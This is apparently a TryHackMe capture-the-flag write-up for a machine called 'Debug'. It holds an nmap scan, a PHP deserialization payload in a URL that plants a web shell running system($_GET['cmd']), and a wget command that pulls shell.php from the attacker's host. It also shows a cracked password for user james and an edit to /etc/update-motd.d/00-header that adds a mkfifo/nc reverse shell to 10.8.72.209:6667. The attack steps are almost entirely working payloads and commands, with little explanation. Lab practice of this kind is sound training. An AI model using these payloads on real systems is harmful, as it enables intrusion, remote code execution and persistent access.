# #1 Introduction
<img width="650" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/01ce8d44-bffa-4cc1-8286-d1565202ffaa">

# #2 nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx debug.thm
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- debug.thm
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# #3 user.txt

## HTTP (port 80)

http://debug.thm/index.php?debug=O:10:%22FormSubmit%22:2:{s:9:%22form_file%22;s:16:%22backup/test2.php%22;s:7:%22message%22;s:27:%22%3C?php%20system($_GET[%22cmd%22]);%22;}
http://debug.thm/backup/test2.php?cmd=wget%20http://10.8.72.209:8000/shell.php
http://debug.thm/backup/shell.php

jamaica          (james)

<img width="1222" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/c969f1e0-2854-4741-9b95-c7df0798a8bc">


we can edit /etc/update-motd.d/00-header
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.72.209 6667 >/tmp/f
